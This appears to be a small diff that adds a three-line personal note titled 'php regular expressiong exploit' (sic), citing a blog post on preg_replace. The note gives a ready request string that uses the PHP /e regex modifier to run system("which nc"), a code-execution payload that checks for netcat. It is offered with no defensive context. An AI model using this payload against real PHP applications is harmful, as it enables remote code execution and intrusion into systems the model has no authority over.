@@ -1,0 +1,3 @@
+php regular expressiong exploit
+    https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
+    pattern=%2Fip_address%2Fe&ipaddress=system("which nc")
